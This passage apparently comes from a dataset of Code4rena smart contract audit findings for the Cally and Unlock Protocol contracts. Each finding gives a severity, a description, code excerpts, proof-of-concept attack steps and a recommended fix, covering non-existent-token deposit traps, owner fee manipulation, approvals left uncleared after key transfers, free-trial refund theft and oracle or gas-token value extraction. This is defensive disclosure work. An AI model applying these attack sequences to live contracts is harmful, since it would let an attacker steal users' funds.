```solidity
function createVault(
    uint256 tokenIdOrAmount,
    address token,
    ...
) external returns (uint256 vaultId) {
    ...
    Vault memory vault = Vault({
        ...
    });

    // vault index should always be odd
    vaultIndex += 2;
    vaultId = vaultIndex;
    _vaults[vaultId] = vault;

    // give msg.sender vault token
    _mint(msg.sender, vaultId);

    emit NewVault(vaultId, msg.sender, token);

    // transfer the NFTs or ERC20s to the contract
    vault.tokenType == TokenType.ERC721
        ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)
        : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);
}
```

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L23-L34>

```solidity
import ""solmate/utils/SafeTransferLib.sol"";

...

contract Cally is CallyNft, ReentrancyGuard, Ownable {
    using SafeTransferLib for ERC20;
    ...
```

When creating a new vault, solmate's `SafeTransferLib` is used for pulling `vault.token` from the caller's account, this issue won't exist if OpenZeppelin's SafeERC20 is used instead.

That's because there is a subtle difference between the implementation of solmate's `SafeTransferLib` and OZ's `SafeERC20`:

OZ's `SafeERC20` checks if the token is a contract or not, solmate's `SafeTransferLib` does not.

See: <https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9>

> Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.

As a result, when the token's address has no code, the transaction will just succeed with no error.

This attack vector was made well-known by the qBridge hack back in Jan 2022.

For our project, this alone still won't be a problem, a vault created and wrongfully accounted for a certain amount of balance for a non-existing token won't be much of a problem, there will be no fund loss as long as the token stays that way (being non-existing).

However, it's becoming popular for protocols to deploy their token across multiple networks and when they do so, a common practice is to deploy the token contract from the same deployer address and with the same nonce so that the token address can be the same for all the networks.

For example: $1INCH is using the same token address for both Ethereum and BSC; Gelato's $GEL token is using the same token address for Ethereum, Fantom and Polygon.

A sophisticated attacker can exploit it by taking advantage of that and setting traps on multiple potential tokens to steal from the future users that deposits with such tokens.

### Proof of Concept

Given:

*   ProjectA has TokenA on another network;
*   ProjectB has TokenB on another network;
*   ProjectC has TokenC on another network;

1.  The attacker `createVault()` for `TokenA`, `TokenB`, and `TokenC` with `10000e18` as `tokenIdOrAmount` each;
2.  A few months later, ProjectB lunched `TokenB` on the local network at the same address;
3.  Alice created a vault with `11000e18 TokenB`;
4.  The attacker called `initiateWithdraw()` and then `withdraw()` to receive `10000e18 TokenB`.

In summary, one of the traps set by the attacker was activated by the deployment of  `TokenB` and Alice was the victim. As a result, `10000e18 TokenB` was stolen by the attacker.

### Recommendation

Consider using OZ's `SafeERC20` instead.






***"
122.md,Owner can modify the feeRate on existing vaults and steal the strike value on exercise,medium,"_Adam, 0x52, 0xf15ers, 0xsanson, berndartmueller, Bludya, BondiPestControl, catchup, crispymangoes, Czar102, eccentricexit, ellahi, GimelSec, hake, horsefacts, hubble, joestakey, Kumpa, pedroais, peritoflores, reassor, shenwilly, shung, smiling_heretic, sseefried, and throttle_

Owner can steal the exercise cost which should have gone to the option seller

### Proof of Concept

There are no restrictions on when the owner can set the `feeRate`:

```solidity
File: contracts/src/Cally.sol   #1

117       /// @notice Sets the fee that is applied on exercise
118       /// @param feeRate_ The new fee rate: fee = 1% = (1 / 100) * 1e18
119       function setFee(uint256 feeRate_) external onlyOwner {
120           feeRate = feeRate_;
121       }
```

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L117-L121>

By using a rate that consumes the exercise cost, the owner can steal Ether from the seller:

```solidity
File: contracts/src/Cally.sol   #2

282           uint256 fee = 0;
283           if (feeRate > 0) {
284               fee = (msg.value * feeRate) / 1e18;
285               protocolUnclaimedFees += fee;
286           }
287   
288           // increment vault beneficiary's ETH balance
289           ethBalance[getVaultBeneficiary(vaultId)] += msg.value - fee;
```

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L282-L289>

The owner can wait for a particularly large-value NFT, snipe that one option, then retire

### Recommended Mitigation Steps

Fix the fee rate per vault during vault creation





***"
122.md,It shouldn’t be possible to create a vault with Cally’ own token,medium,"<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L193>

<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L199>

### Impact

Affected code:

*   <https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L193>
*   <https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L199>

Currently it’s possible to create an ERC-721 vault using Cally’ own address as `token`, and using the freshly minted vault id as `tokenIdOrAmount`. This results in a new vault whose ownership is passed to Cally contract immediately upon creation.

The vault allows users to perform `buyOption` and increase the ETH balance of the Cally contract itself, which is still the vault beneficiary. As soon as an user calls `exercise`, she will receive the `vault.tokenIdOrAmount` in exchange, which in this case coincides with the vault nft. However this is of no good because the final user may just initiate a withdrawal, which will:

*   always fail because the vault id is burned (<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L335>) and then transferred back to the user (<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L344>)
*   leave all the ETH unredemable in Cally contract

So the vault will be unusable and the ETH deposited by users to buy/exercise options will remain locked in Cally contract

### Proof of Concept

*   Current vault id is, let’s say, 11
*   User deploys a vault with Cally’ address as `token` and `13` as `tokenIdOrAmount`
*   Since `createVault()` mints the vault token to the user, and then transfers the underlying address from the user, an user is able to create a vault with something she doesn’t own at the moment of the `createVault()` function call, because it’s created while the function runs
*   The vault `13` is pretty limited in functionality, because Cally’ smart contract is the owner
*   However, users can still buy options: so Alice and Bob deposit their premiums
*   Whoever `exercise` the active option, becomes the vault owner now; this is of no good because no one can actually call `withdraw()` as it will always revert, and no one can recover the ETH deposited by Alice and Bob as they are locked forever

### Recommended Mitigation Steps

Add the following check at the start of `createVault()`:

```jsx
require(token != address(this), ""Cant use Cally as token"");
```






***"
122.md,User's may accidentally overpay in `buyOption()` and the excess will be paid to the vault creator,medium,"It is possible for a user purchasing an option to accidentally overpay the premium during `buyOption()`.

Any excess funds paid for in excess of the premium will be transferred to the vault creator.

The premium is fixed at the time the vault is first created by `vault.premiumIndex`. Hence there is no need to allow users to overpay since there will be no benefit.

### Proof of Concept

`buyOption()` allows `msg.value > premium`

```solidity
        uint256 premium = getPremium(vaultId);
        require(msg.value >= premium, ""Incorrect ETH amount sent"");
```

### Recommended Mitigation Steps

Consider modifying the check such that the `msg.value` is exactly equal to the `premuim`. e.g.

```solidity
        uint256 premium = getPremium(vaultId);
        require(msg.value == premium, ""Incorrect ETH amount sent"");
```






***"
122.md,Vaults steal rebasing tokens' rewards,medium,"heretic_

Rebasing tokens are tokens that have each holder's `balanceof()` increase over time. Aave aTokens are an example of such tokens.

### Impact

If rebasing tokens are used as the vault token, rewards accrue to the vault and cannot be withdrawn by either the option seller or the owner, and remain locked forever.

### Proof of Concept

The amount 'available' for withdrawal comes from an input parameter and is stored for later operations:

```solidity
File: contracts/src/Cally.sol   #1

173           Vault memory vault = Vault({
174               tokenIdOrAmount: tokenIdOrAmount,
175               token: token,
176               premiumIndex: premiumIndex,
177               durationDays: durationDays,
178               dutchAuctionStartingStrikeIndex: dutchAuctionStartingStrikeIndex,
179               currentExpiration: uint32(block.timestamp),
180               isExercised: false,
181               isWithdrawing: false,
182               tokenType: tokenType,
183               currentStrike: 0,
184               dutchAuctionReserveStrike: dutchAuctionReserveStrike
185           });
186   
187           // vault index should always be odd
188           vaultIndex += 2;
189           vaultId = vaultIndex;
190           _vaults[vaultId] = vault;
191   
192           // give msg.sender vault token
193           _mint(msg.sender, vaultId);
194   
195           emit NewVault(vaultId, msg.sender, token);
196   
197           // transfer the NFTs or ERC20s to the contract
198           vault.tokenType == TokenType.ERC721
199               ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)
200               : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);
```

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L173-L200>

The amount actually available grows over time and is only known at the time of withdrawal. The option withdrawal/exercise use the original amount:

```solidity
File: contracts/src/Cally.sol   #2

345               : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);
```

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L345>

```solidity
File: contracts/src/Cally.sol   #3

296               : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);
```

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L296>

### Recommended Mitigation Steps

Track total amounts currently deposited and allow vault creators to withdraw excess on a pro-rata basis




***"
122.md,Expiration calculation overflows if call option duration ≥ 195 days,medium,"`vault.durationDays` is of type `uint8`, thus allowing a maximum value of 255. `1 days = 86400`, thus fitting into a `uint24`. Solc creates a temporary variable to hold the result of the intermittent multiplication `vault.durationDays * 1 days` using the data type of the larger operand.

In this case, the intermittent data type used would be `uint24`, which has a maximum value of `2**24 - 1 = 16777215`. The maximum number allowable before overflow achieved is therefore `(2**24 - 1) / 86400 = 194`.

### Proof of Concept

Insert this test case into [BuyOption.t.sol](https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/test/units/BuyOption.t.sol)

```solidity

function testCannotBuyDueToOverflow() public {
  vm.startPrank(babe);
  bayc.mint(babe, 2);
  // duration of 195 days
  vaultId = c.createVault(2, address(bayc), premiumIndex, 195, strikeIndex, 0, Cally.TokenType.ERC721);
  vm.stopPrank();

  vm.expectRevert(stdError.arithmeticError);
  c.buyOption{value: premium}(vaultId);
}
```

Then run

    forge test --match-contract TestBuyOption --match-test testCannotBuyDueToOverflow

### Tidbit

This was the 1 high-severity bug that I wanted to mention at the end of the [C4 TrustX showcase](https://youtu.be/up9eqFRLgMQ?t=5722) but unfortunately could not due to a lack of time :( It can be found in the [vulnerable lottery contract](https://gist.github.com/HickupHH3/d214cfe6e4d003f428a63ae7d127af2d) on L39. Credits to Pauliax / Thunder for the recommendation and raising awareness of this bug =p

### Reference

[Article](https://muellerberndt.medium.com/building-a-secure-nft-gaming-experience-a-herdsmans-diary-1-91aab11139dc)

### Recommended Mitigation Steps

Cast the multiplication into `uint32`.

```solidity
vault.currentExpiration = uint32(block.timestamp) + uint32(vault.durationDays) * 1 days;
```






***"
122.md,Owner can set the feeRate to be greater than 100% and cause all future calls to `exercise` to revert,medium,"### Impact

The owner can force options to be non-exercisable, collecting premium without risking the loss of their NFT/tokens

### Proof of Concept

After a buyer buys an option owned by the owner, the owner can change the fee rate to be close to `type(uint256).max`, which will cause the subtraction below to always underflow, preventing the exercise of the option. Once the option expires, the owner can change the fee back and wait for another buyer

```solidity
File: contracts/src/Cally.sol   #1

288           // increment vault beneficiary's ETH balance
289           ethBalance[getVaultBeneficiary(vaultId)] += msg.value - fee;
```

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L288-L289>

### Recommended Mitigation Steps

Add reasonable fee rate bounds checks in the `setFee()` function




***"
122.md,Lack of 0 amount check allows malicious user to create infinite vaults,medium,"A griefer is able to create as many vaults as they want by simply calling `createVault()` with `tokenIdOrAmount = 0`. This will most likely pose problems on the front-end of the Cally protocol because there will be a ridiculously high number of malicious vaults displayed to actual users.

I define these vaults as malicious because it is possible that a user accidently buys a call on this vault which provides 0 value in return. Overall, the presence of zero-amount vaults is damaging to Cally's product image and functionality.

### Proof of Concept

*   User calls `createVault(0,,,,);` with an ERC20 type.
*   There is no validation that `amount > 0`
*   Function will complete successfully, granting the new vault NFT to the caller.
*   Cally protocol is filled with unwanted 0 amount vaults.

### Recommended Mitigation Steps

Add the simple check `require(tokenIdOrAmount > 0, ""Amount must be greater than 0"");`





***"
122.md,Vault is Not Compatible with Fee Tokens and Vaults with Such Tokens Could Be Exploited,medium,"heretic, TrungOre, VAD37, and WatchPug_

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L198-L200>

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L294-L296>

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L343-L345>

### Impact

Some ERC20 tokens charge a transaction fee for every transfer (used to encourage staking, add to liquidity pool, pay a fee to contract owner, etc.). If any such token is used in the `createVault()` function, either the token cannot be withdrawn from the contract (due to insufficient token balance), or it could be exploited by other such token holders and the `Cally` contract would lose economic value and some users would be unable to withdraw the underlying asset.

### Proof of Concept

Plenty of ERC20 tokens charge a fee for every transfer (e.g. Safemoon and its forks), in which the amount of token received is less than the amount being sent. When a fee token is used as the `token` in the `createVault()` function, the amount received by the contract would be less than the amount being sent. To be more precise, the increase in the `cally` contract token balance would be less than `vault.tokenIdOrAmount` for such ERC20 token because of the fee.

            vault.tokenType == TokenType.ERC721
                ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)
                : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);

The implication is that both the `exercise()` function and the `withdraw()` function are guaranteed to revert if there's no other vault in the contract that contains the same fee tokens, due to insufficient token balance in the `Cally` contract.

When an attacker observes that a vault is being created that contains such fee tokens, the attacker could create a new vault himself that contains the same token, and then withdraw the same amount. Essentially the `Cally` contract would be paying the transfer fee for the attacker because of how the token amount is recorded. This causes loss of user fund and loss of value from the `Cally` contract. It would make economic sense for the attacker when the fee charged by the token accrue to the attacker. The attacker would essentially use the `Cally` contract as a conduit to generate fee income.

### Recommended Mitigation Steps

Recommend disallowing fee tokens from being used in the vault. This can be done by adding a `require()` statement to check that the amount increase of the `token` balance in the `Cally` contract is equal to the amount being sent by the caller of the `createVault()` function.






***"
122.md,Use safeTransferFrom instead of transferFrom for ERC721 transfers,medium,"<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L199>

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L295>

<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L344>

### Details & Impact

The `transferFrom()` method is used instead of `safeTransferFrom()`, presumably to save gas. I however argue that this isn’t recommended because:

*   [OpenZeppelin’s documentation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-) discourages the use of `transferFrom()`, use `safeTransferFrom()` whenever possible
*   Given that any NFT can be used for the call option, there are a few NFTs (here’s an [example](https://github.com/sz-piotr/eth-card-game/blob/master/src/ethereum/contracts/ERC721Market.sol#L20-L31)) that have logic in the `onERC721Received()` function, which is only triggered in the `safeTransferFrom()` function and not in `transferFrom()`

### Recommended Mitigation Steps

Call the `safeTransferFrom()` method instead of `transferFrom()` for NFT transfers. Note that the `CallyNft` contract should inherit the `ERC721TokenReceiver` contract as a consequence.

```solidity
abstract contract CallyNft is ERC721(""Cally"", ""CALL""), ERC721TokenReceiver {...}
```




***"
122.md,`createVault()` does not confirm whether `tokenType` and `token`’s type are the same,medium,"<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L158-L201>

<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L296>

<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L345>

### Impact

When calling `createVault()`, `tokenType` could be different from `token`’s type. If a user accidentally used the wrong `tokenType`, it could lead to two different results.

If `token` is an ERC20 token and the user uses `TokenType.ERC721` as `tokenType`. It is less harmful, since `ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)` still works when `vault.token` is actually ERC20 token.

However, if `token` is an ERC721 token and the user uses `TokenType.ERC20` as `tokenType`. When doing `creatVault()`, `ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount)` works fine. But when doing `exercise()` or `withdraw()`, `ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);` doesn’t work since ERC721 doesn’t implement `safeTransfer()` function. In consequence, the ERC721 token is frozen in the vault.

### Proof of Concept

`createVault()` does not confirm whether `tokenType` and `token`’s type are the same.
But the token can still be transferred into this contract. Since `transferFrom()` is implemented in ERC20 and `safeTransferFrom()` is implemented in ERC721
<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L158-L201>

        function createVault(
            uint256 tokenIdOrAmount,
            address token,
            uint8 premiumIndex,
            uint8 durationDays,
            uint8 dutchAuctionStartingStrikeIndex,
            uint256 dutchAuctionReserveStrike,
            TokenType tokenType
        ) external returns (uint256 vaultId) {
            require(premiumIndex < premiumOptions.length, ""Invalid premium index"");
            require(dutchAuctionStartingStrikeIndex < strikeOptions.length, ""Invalid strike index"");
            require(dutchAuctionReserveStrike < strikeOptions[dutchAuctionStartingStrikeIndex], ""Reserve strike too small"");
            require(durationDays > 0, ""durationDays too small"");
            require(tokenType == TokenType.ERC721 || tokenType == TokenType.ERC20, ""Invalid token type"");

            Vault memory vault = Vault({
                tokenIdOrAmount: tokenIdOrAmount,
                token: token,
                premiumIndex: premiumIndex,
                durationDays: durationDays,
                dutchAuctionStartingStrikeIndex: dutchAuctionStartingStrikeIndex,
                currentExpiration: uint32(block.timestamp),
                isExercised: false,
                isWithdrawing: false,
                tokenType: tokenType,
                currentStrike: 0,
                dutchAuctionReserveStrike: dutchAuctionReserveStrike
            });

            // vault index should always be odd
            vaultIndex += 2;
            vaultId = vaultIndex;
            _vaults[vaultId] = vault;

            // give msg.sender vault token
            _mint(msg.sender, vaultId);

            emit NewVault(vaultId, msg.sender, token);

            // transfer the NFTs or ERC20s to the contract
            vault.tokenType == TokenType.ERC721
                ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)
                : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);
        }

However when doing `exercise()` or `withdraw()`, it always reverts since ERC721 doesn’t implement `safeTransfer()`. The ERC721 token is frozen in the contract.

<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L296>

```
    function exercise(uint256 optionId) external payable {
        …
        // transfer the NFTs or ERC20s to the exerciser
        vault.tokenType == TokenType.ERC721
            ? ERC721(vault.token).transferFrom(address(this), msg.sender, vault.tokenIdOrAmount)
            : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);
    }

```

<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L345>

```
    function withdraw(uint256 vaultId) external nonReentrant {
        …
        // transfer the NFTs or ERC20s back to the owner
        vault.tokenType == TokenType.ERC721
            ? ERC721(vault.token).transferFrom(address(this), msg.sender, vault.tokenIdOrAmount)
            : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);
    }

```

### Recommended Mitigation Steps

Confirm whether `tokenType` and `token`’s type are the same in `createVault()`.





***"
54.md,MEV miner can mint larger than expected UDT total supply,high,"`UnlockProtocol` attempts to calculate gas reimbursement using `tx.gasprice`, typically users who falsify `tx.gasprice `would lose gas to miners and therefore not obtain any advantage over the protocol itself. This does present capabilities for miners to extract value, as they can submit their own transactions, or cooperate with a malicious user, reimbursing a portion (or all) or the `tx.gasprice` used. As the following calculation is made;

        uint tokensToDistribute = (estimatedGasForPurchase * tx.gasprice) * (125 * 10 ** 18) / 100 / udtPrice;

we can see that arbitrary `tx.gasprices` can rapidly inflate the `tokensToDistribute`. Though capped at maxTokens, this value can be up to half the total supply of UDT, which could dramatically affect the value of UDT potentially leading to lucrative value extractions outside of the pool.

#### Recommended Mitigation Steps

Using an oracle service to determine the average gas price and ensuring it is within some normal bounds that has not been subjected to arbitrary value manipulation."
54.md,Wrong design/implementation of freeTrial allows attacker to steal funds from the protocol,high,"The current design/implementation of `freeTrial` allows users to get full refund before the `freeTrial` ends. Plus, a user can transfer partial of their time to another user using `shareKey`.

This makes it possible for the attacker to steal from the protocol by transferring `freeTrial` time from multiple addresses to one address and adding up to `expirationDuration` and call refund to steal from the protocol.

#### Proof of Concept

Given:

*   `keyPrice` is 1 ETH;
*   `expirationDuration` is 360 days;
*   `freeTrialLength` is 31 days.

The attacker can create two wallet addresses: Alice and Bob.

1.  Alice calls `purchase()`, transfer 30 days via `shareKey()` to Bob, then calls `cancelAndRefund()` to get full refund; Repeat 12 times;
2.  Bob calls `cancelAndRefund()` and get 1 ETH.

#### Recommendation

Consider disabling `cancelAndRefund()` for users who transferred time to another user.

 >
 > For lock manager who still want to offer free trials, the best approach would probably be to set a high transfer fee to make sure that free trials cannot be transfered.
 >
 > As a consequence of this, I am not sure this is as critical as indicated by the submitter.


 > In short: this is valid, but only an issue for locks which are enabling free trials (no one has done it) and we would make sure our UI shows this as a potential issue.
 > In other words: a lock manager would need to _explicitly_ enable free trials, despite our warning to put their own funds at risk. For that reason I don't think this is ""High"".

 >
 > In my honest opinion, a warning isn't sufficient to prevent such abuse. I think on-chain enforcement ideal in this situation."
54.md,`MixinTransfer.sol#transferFrom` Wrong implementation can potentially allows attackers to reverse transfer and cause fund loss to the users,high,"<https://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/mixins/MixinTransfer.sol#L131-L152>

```solidity
if (toKey.tokenId == 0) {
  toKey.tokenId = _tokenId;
  _recordOwner(_recipient, _tokenId);
  // Clear any previous approvals
  _clearApproval(_tokenId);
}

if (previousExpiration <= block.timestamp) {
  // The recipient did not have a key, or had a key but it expired. The new expiration is the sender's key expiration
  // An expired key is no longer a valid key, so the new tokenID is the sender's tokenID
  toKey.expirationTimestamp = fromKey.expirationTimestamp;
  toKey.tokenId = _tokenId;

  // Reset the key Manager to the key owner
  _setKeyManagerOf(_tokenId, address(0));

  _recordOwner(_recipient, _tokenId);
} else {
  // The recipient has a non expired key. We just add them the corresponding remaining time
  // SafeSub is not required since the if confirms `previousExpiration - block.timestamp` cannot underflow
  toKey.expirationTimestamp = fromKey.expirationTimestamp + previousExpiration - block.timestamp;
}
```

Based on the context, L131-136 seems to be the logic of handling the case of the recipient with no key, and L138-148 is handing the case of the recipient's key expired.

However, in L131-136, the key manager is not being reset.

This allows attackers to keep the role of key manager after the transfer, and transfer the key back or to another recipient.

#### Proof of Concept

Given:

*   Alice owns a key that is valid until 1 year later.

1.  Alice calls `setKeyManagerOf()`, making herself the keyManager;
2.  Alice calls `transferFrom()`, transferring the key to Bob; Bob might have paid a certain amount of money to Alice upon receive of the key;
3.  Alice calls `transferFrom()` again, transferring the key back from Bob.

#### Recommendation

Consider resetting the key manager regardless of the status of the recipient's key."
54.md,Approvals not cleared after key transfer,high,"The locks implement three different approval types, see `onlyKeyManagerOrApproved` for an overview:

*   key manager (map `keyManagerOf`)
*   single-person approvals (map `approved`). Cleared by `_clearApproval` or `_setKeyManagerOf`
*   operator approvals (map `managerToOperatorApproved`)

The `MixinTransfer.transferFrom` requires any of the three approval types in the `onlyKeyManagerOrApproved` modifier on the tokenId to authenticate transfers from `from`.

Notice that if the `to` address previously had a key but it expired only the `_setKeyManagerOf` call is performed, which does not clear `approved` if the key manager was already set to 0:

```solidity
function transferFrom(
  address _from,
  address _recipient,
  uint _tokenId
)
  public
  onlyIfAlive
  hasValidKey(_from)
  onlyKeyManagerOrApproved(_tokenId)
{
  // @audit this is skipped if user had a key that expired
  if (toKey.tokenId == 0) {
    toKey.tokenId = _tokenId;
    _recordOwner(_recipient, _tokenId);
    // Clear any previous approvals
    _clearApproval(_tokenId);
  }

  if (previousExpiration <= block.timestamp) {
    // The recipient did not have a key, or had a key but it expired. The new expiration is the sender's key expiration
    // An expired key is no longer a valid key, so the new tokenID is the sender's tokenID
    toKey.expirationTimestamp = fromKey.expirationTimestamp;
    toKey.tokenId = _tokenId;

    // Reset the key Manager to the key owner
    // @audit  doesn't clear approval if key manager already was 0
    _setKeyManagerOf(_tokenId, address(0));

    _recordOwner(_recipient, _tokenId);
  }
  // ...
}

// 
function _setKeyManagerOf(
  uint _tokenId,
  address _keyManager
) internal
{
  // @audit-ok only clears approved if key manager updated
  if(keyManagerOf[_tokenId] != _keyManager) {
    keyManagerOf[_tokenId] = _keyManager;
    _clearApproval(_tokenId);
    emit KeyManagerChanged(_tokenId, address(0));
  }
}
```

#### Impact

It's possible to sell someone a key and then claim it back as the approvals are not always cleared.

#### Proof Of Concept

*   Attacker A has a valuable key (`tokenId = 42`) with an expiry date far in the future.
*   A sets approvals for their second attacker controlled account A' by calling `MixinKeys.setApprovalForAll(A', true)`, which sets `managerToOperatorApproved[A][A'] = true`.
*   A clears the key manager by setting it to zero, for example, by transferring it to a second account that does not have a key yet, this calls the above `_setKeyManagerOf(42, address(0));` in `transferFrom`
*   A sets single-token approval to A' by calling `MixinKeys.approve(A', 42)`, setting `approved[42] = A'`.
*   A sells the token to a victim V for a discount (compared to purchasing it from the Lock). The victim needs to have owned a key before which already expired. The `transferFrom(A, V, 42)` call sets the owner of token 42 to `V`, but does not clear the `approved[42] == A'` field as described above. (`_setKeyManagerOf(_tokenId, address(0));` is called but the key manager was already zero, which then does not clear approvals.)
*   A' can claim back the token by calling `transferFrom(V, A', 42)` and the `onlyKeyManagerOrApproved(42)` modifier will pass as `approved[42] == A'` is still set.

#### Recommended Mitigation Steps

The `_setKeyManagerOf` function should not handle clearing approvals of single-token approvals (`approved`) as these are two separate approval types.
The `transferFrom` function should always call `_clearApproval` in the `(previousExpiration <= block.timestamp)` case.

 > This is valid and we will fix it."
54.md,Unlock: free UDT arbitrage opportunity,medium,"Uniswap v2 made oracle attacks much more expensive to execute (since it needs to be manipulated over X number of blocks) however its biggest drawback is that it reacts slow to price volatility (depends on how far back you look). Depending on a single oracle is still very risky and can be exploited given the correct conditions.

Assuming the ideal conditions, it is possible to purchase many keys across many locks for the UDT token that is distributed to the referrer and sell them on some other exchanges where the price of UDT is higher; high enough such that the malicious user can still profit even after requesting for a refund (w/ or w/o a free trial).

#### Proof of Concept

This exploit is made possible because of:

*   the over dependency on a single price oracle
*   UDT token distribution logic is flawed

The following assumptions has to be true for this attack to work:

1.  price of UDT on an exchange is much higher than that from the price retrieved from the `uniswapOracle`.
2.  Since the price retrieved by `udtOracle.updateAndConsult()` only updates once per day, it is slow to react to the volatility of UDT price movements.
3.  Malicious user creates a lock and buys many keys across multiple addresses.
4.  Malicious user sells these UDT tokens on the exchanges w/ the higher price.
5.  Malicious user requests for a refund on the keys owned.
6.  Repeat until it is no longer profitable i.e. price on other exchanges become close to parity with the price retrieved by the `uniswapOracle`.

#### Recommended Mitigation Steps

*   Use the average of multiple oracle sources so that the price of UDT tokens (from `Unlock.sol`'s PoV) reacts faster.
*   UDT tokens distributed based on the duration of key ownership."
54.md,Potential economic attack on UDT grants to the referrer,medium,"In the current implementation, `Unlock.sol#recordKeyPurchase()` will send `estimatedGasForPurchase * tx.gasprice` worth of UDT to the referrer.

<https://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/Unlock.sol#L325-L325>

```solidity
uint tokensToDistribute = (estimatedGasForPurchase * tx.gasprice) * (125 * 10 ** 18) / 100 / udtPrice;
```

We believe there are multiple potential economic attack vectors to exploit this.

If `estimatedGasForPurchase` is misconfigured to a higher amount than the actual avg gas cost for a purchase call, or future network upgrades make the actual gas cost become lower than the configured `estimatedGasForPurchase`, it can be exploited simply by creating a lock and call `purchase()` many times to mint UDT.

Even if `estimatedGasForPurchase` is configured to an amount similar to the actual gas cost, a more sophisticated attack is still possible:

#### Proof of Concept

Given:

*   `estimatedGasForPurchase` is configured as `200,000`;
*   The gas cost of a regular purchase call is about `200,000`.

The attacker can create a lock contract and set the token address to a special gas saving token, which will SELFDESTRUCT to get a gas refund on `transfer`.

The attacker can:

1.  Mint gas saving token with gas price: `1 gwei`;
2.  Call `purchase()` and use 48 contract slots with gas price: `1000 gwei`;

Total gas saved will be \~0.8 ETH (or other native tokens, eg. BNB, MATIC). Therefore, the attacker will profit \~0.8 ETH worth of UDT.

See: <https://gastoken.io/>

#### Recommendation

Consider setting a global daily upper limit of total UDT grants to referrers, plus, an upper limit for UDT minted per purchase.


 > As the protocol may leak value based on certain network assumptions, I'll mark this as `medium` severity.
 > 
> `
> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
> `

**Please note: the following additional discussions and re-assessment took place approximately 2 months after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.**

 > The tokens that are used to compute GDP and distribute tokens have to be approved by the DAO (right now only USDC, DAI and BAT have been approved on mainnet, and only USDC on Polygon). I don't think the DAO would approve gas tokens givem that indeed they could result in leakage of UDT, so I think it is `minor`."
54.md,Support of different ERC20 tokens,medium,"The current version of the codebase does not handle special cases of tokens, e.g. deflationary, rebasing, or those that return true/false on success (see: <https://github.com/d-xo/weird-erc20>). Function purchase transfers tokens from msg.sender but it does not check the return value, nor how many tokens were actually transferred:

```solidity
  token.transferFrom(msg.sender, address(this), pricePaid);
```

#### Recommended Mitigation Steps

I have 2 suggestions here:

